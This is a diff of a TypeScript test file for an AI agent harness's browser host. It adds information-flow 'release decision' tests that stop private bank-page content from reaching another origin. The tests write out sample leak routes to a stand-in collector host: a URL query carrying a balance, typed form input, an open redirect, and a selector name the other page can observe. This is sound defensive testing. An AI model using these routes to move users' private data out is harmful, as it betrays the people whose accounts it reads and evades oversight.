@@ -4,11 +4,16 @@ import { expect } from "@std/expect";
 import { encodeBase64 } from "@std/encoding/base64";
 import { normalize } from "@std/path/posix";
 
-import type {
-  BrowserHostOperation,
-  BrowserHostResult,
-  HarnessBrowserHost,
+import { browserOwnerViewClause } from "../src/browser-release.ts";
+import {
+  type BrowserHostOperation,
+  type BrowserHostResult,
+  type BrowserReleaseCovers,
+  browserReleaseCovers,
+  type HarnessBrowserHost,
+  verifyBrowserReleaseDecision,
 } from "../src/contracts/browser-host.ts";
+import { createToolOutputId } from "../src/contracts/tool-result.ts";
 import { CfHarnessEngine } from "../src/engine.ts";
 import {
   createHarnessHandleTable,
@@ -40,6 +45,14 @@ const PNG_BYTES = new Uint8Array([
   0x0a,
   0x00,
 ]);
+
+/**
+ * The release decision an operation carries as the `sequence`-th of its
+ * session, with nothing sent that may not go anywhere on the open web.
+ */
+const openWeb = (sequence: number, action: string) => ({
+  decision: { sequence, sink: `browser.${action}`, covers: "public-web" },
+});
 
 class FakeSandboxRuntime implements SandboxRuntime {
   describe(): SandboxRuntimeDescription {
@@ -139,17 +152,18 @@ describe("browser-host-backend", () => {
       await invoke(engine, { action: "fill", ref: "@e2", value: "blue" });
 
       expect(host.operations).toEqual([
-        { action: "open", url: "https://shop.example/" },
-        { action: "back" },
-        { action: "scroll", direction: "down" },
+        { action: "open", url: "https://shop.example/", ...openWeb(1, "open") },
+        { action: "back", ...openWeb(2, "back") },
+        { action: "scroll", direction: "down", ...openWeb(3, "scroll") },
         { action: "snapshot", interactive: true },
-        { action: "click", x: 120, y: 48.5 },
-        { action: "click", ref: "@e3" },
+        { action: "click", x: 120, y: 48.5, ...openWeb(5, "click") },
+        { action: "click", ref: "@e3", ...openWeb(6, "click") },
         { action: "wait", urlPattern: "**/checkout" },
         {
           action: "fill",
           ref: "@e2",
           value: { kind: "text", text: "blue" },
+          ...openWeb(8, "fill"),
         },
       ]);
     });
@@ -216,12 +230,17 @@ describe("browser-host-backend", () => {
 
       expect(host.operations).toEqual([
         { action: "get", kind: "title" },
-        { action: "get", kind: "text", target: "body" },
+        { action: "get", kind: "text", target: "body", ...openWeb(2, "get") },
         { action: "wait", ref: "@e5" },
         { action: "wait", loadState: "load" },
-        { action: "scroll", direction: "up", ref: "@e6" },
-        { action: "check", ref: "@e7" },
-        { action: "press", key: "Enter" },
+        {
+          action: "scroll",
+          direction: "up",
+          ref: "@e6",
+          ...openWeb(5, "scroll"),
+        },
+        { action: "check", ref: "@e7", ...openWeb(6, "check") },
+        { action: "press", key: "Enter", ...openWeb(7, "press") },
       ]);
     });
 
@@ -430,6 +449,7 @@ describe("browser-host-backend", () => {
             text: "https://shop.example/item/7",
             description: "a value an agent found",
           },
+          ...openWeb(1, "open"),
         },
         {
           action: "select",
@@ -439,6 +459,7 @@ describe("browser-host-backend", () => {
             text: "XL",
             description: "a value an agent found",
           },
+          ...openWeb(2, "select"),
         },
       ]);
     });
@@ -876,6 +897,240 @@ describe("browser-host-backend", () => {
       const output = await invoke(engine, { action: "screenshot" });
 
       expect(output).toMatchObject({ status: "error", code: "command_failed" });
+    });
+  });
+
+  describe("release decisions", () => {
+    const OWNER = "did:key:z6MkownerOfTheBrowserHostReleaseTests";
+    const BANK = "https://bank.example";
+    const COLLECTOR = "https://collector.example";
+
+    /**
+     * Makes the run's model context hold what a page showing the owner's
+     * account on `origin` showed, as reading it would.
+     */
+    const readPrivatePage = async (engine: CfHarnessEngine, origin: string) => {
+      await engine.recordCfcModelContextObservations([{
+        toolCallId: "call-private-read",
+        toolId: "browser",
+        outputId: createToolOutputId(engine.getRunState().runId, "browser", 0),
+        channels: ["output"],
+        label: { confidentiality: [browserOwnerViewClause(OWNER, origin)] },
+      }]);
+    };
+
+    /**
+     * A host that holds navigations to its decisions, as the contract asks:
+     * it refuses an operation whose decision is not the one issued for it,
+     * and a top-level load, its own or a redirect's, outside coverage.
+     */
+    class CoverageHost implements HarnessBrowserHost {
+      readonly operations: BrowserHostOperation[] = [];
+      readonly #redirects: Record<string, string>;
+      #page = `${BANK}/account`;
+      #covers: BrowserReleaseCovers = "public-web";
+
+      constructor(redirects: Record<string, string> = {}) {
+        this.#redirects = redirects;
+      }
+
+      perform(operation: BrowserHostOperation): Promise<BrowserHostResult> {
+        this.operations.push(operation);
+        const refusal = verifyBrowserReleaseDecision(
+          operation,
+          this.operations.length,
+        );
+        if (refusal !== undefined) {
+          return Promise.resolve({ status: "invalid", message: refusal });
+        }
+        this.#covers = operation.decision?.covers ?? this.#covers;
+        if (operation.action === "open") {
+          let url = typeof operation.url === "string"
+            ? operation.url
+            : operation.url.text;
+          for (;;) {
+            const origin = new URL(url).origin;
+            if (!browserReleaseCovers(this.#covers, origin)) {
+              return Promise.resolve({
+                status: "navigation-refused",
+                message: `the page was to load a document on ${origin}`,
+                page: { url: this.#page, title: "" },
+              });
+            }
+            const next = this.#redirects[url];
+            if (next === undefined) {
+              break;
+            }
+            url = next;
+          }
+          this.#page = url;
+        }
+        return Promise.resolve({
+          status: "ok",
+          page: { url: this.#page, title: "" },
+        });
+      }
+    }
+
+    it("refuses opening another origin with what a private page showed in the address, and sends the host nothing", async () => {
+      const host = new CoverageHost();
+      const engine = createEngine(host, "enforce-strict");
+      await readPrivatePage(engine, BANK);
+
+      const output = await invoke(engine, {
+        action: "open",
+        url: `${COLLECTOR}/?balance=1234`,
+      });
+
+      expect(output).toMatchObject({
+        status: "error",
+        code: "release_refused",
+        releaseDecision: {
+          reasonCode: "cfc_release_refused",
+          boundary: "release",
+          sink: "browser.open",
+          audience: COLLECTOR,
+        },
+      });
+      expect(output.status === "error" && output.message).toContain(
+        `browser.open to ${COLLECTOR} is refused`,
+      );
+      expect(host.operations).toEqual([]);
+    });
+
+    it("refuses typing what a private page showed into a page of another origin", async () => {
+      const host = new CoverageHost();
+      const engine = createEngine(host, "enforce-strict");
+      await invoke(engine, { action: "open", url: `${COLLECTOR}/form` });
+      await readPrivatePage(engine, BANK);
+
+      const output = await invoke(engine, {
+        action: "type",
+        ref: "@e1",
+        value: "1234",
+      });
+
+      expect(output).toMatchObject({
+        status: "error",
+        code: "release_refused",
+        releaseDecision: { sink: "browser.type", audience: COLLECTOR },
+      });
+      expect(host.operations.map((operation) => operation.action)).toEqual([
+        "open",
+      ]);
+    });
+
+    it("sends what a private page showed back to its own origin, under a decision covering that origin alone", async () => {
+      const host = new CoverageHost();
+      const engine = createEngine(host, "enforce-strict");
+      await invoke(engine, { action: "open", url: `${BANK}/account` });
+      await readPrivatePage(engine, BANK);
+
+      const output = await invoke(engine, {
+        action: "type",
+        ref: "@e1",
+        value: "1234",
+      });
+
+      expect(output).toMatchObject({ status: "ok" });
+      expect(host.operations.at(-1)?.decision).toEqual({
+        sequence: 2,
+        sink: "browser.type",
+        covers: [BANK],
+      });
+    });
+
+    it("returns `navigation_refused` when an open redirect on the private page's origin leads to another", async () => {
+      const host = new CoverageHost({
+        [`${BANK}/out?to=collector`]: `${COLLECTOR}/?balance=1234`,
+      });
+      const engine = createEngine(host, "enforce-strict");
+      await readPrivatePage(engine, BANK);
+
+      const output = await invoke(engine, {
+        action: "open",
+        url: `${BANK}/out?to=collector`,
+      });
+
+      expect(host.operations[0].decision?.covers).toEqual([BANK]);
+      expect(output).toMatchObject({
+        status: "error",
+        code: "navigation_refused",
+      });
+      expect(output.status === "error" && output.message).toContain(
+        COLLECTOR,
+      );
+    });
+
+    it("keeps a session to the origin it sent private content into", async () => {
+      const host = new CoverageHost();
+      const engine = createEngine(host, "enforce-strict");
+      await invoke(engine, { action: "open", url: `${BANK}/account` });
+      await readPrivatePage(engine, BANK);
+      await invoke(engine, { action: "type", ref: "@e1", value: "1234" });
+
+      await invoke(engine, { action: "back" });
+
+      expect(host.operations.at(-1)?.decision?.covers).toEqual([BANK]);
+    });
+
+    it("sends what the open web showed anywhere on it", async () => {
+      const host = new CoverageHost();
+      const engine = createEngine(host, "enforce-strict");
+
+      const output = await invoke(engine, {
+        action: "open",
+        url: `${COLLECTOR}/`,
+      });
+
+      expect(output).toMatchObject({ status: "ok" });
+      expect(output).not.toHaveProperty("releaseDecision");
+      expect(host.operations[0].decision?.covers).toBe("public-web");
+    });
+
+    it("sends under observation, covering the open web, and records what enforcement would have refused", async () => {
+      const host = new CoverageHost();
+      const engine = createEngine(host, "observe");
+      await readPrivatePage(engine, BANK);
+
+      const output = await invoke(engine, {
+        action: "open",
+        url: `${COLLECTOR}/?balance=1234`,
+      });
+
+      expect(output).toMatchObject({
+        status: "ok",
+        releaseDecision: {
+          reasonCode: "cfc_release_observed",
+          sink: "browser.open",
+          audience: COLLECTOR,
+        },
+      });
+      expect(host.operations[0].decision?.covers).toBe("public-web");
+    });
+
+    it("refuses reading the text of a selector on another origin, since the page can watch it resolve", async () => {
+      const host = new CoverageHost();
+      const engine = createEngine(host, "enforce-strict");
+      await invoke(engine, { action: "open", url: `${COLLECTOR}/` });
+      await readPrivatePage(engine, BANK);
+
+      const output = await invoke(engine, {
+        action: "get",
+        kind: "text",
+        target: "#balance-1234",
+      });
+      const byRef = await invoke(engine, {
+        action: "get",
+        kind: "text",
+        target: "@e4",
+      });
+
+      expect(output).toMatchObject({
+        status: "error",
+        code: "release_refused",
+      });
+      expect(byRef).toMatchObject({ status: "ok" });
     });
   });
 });
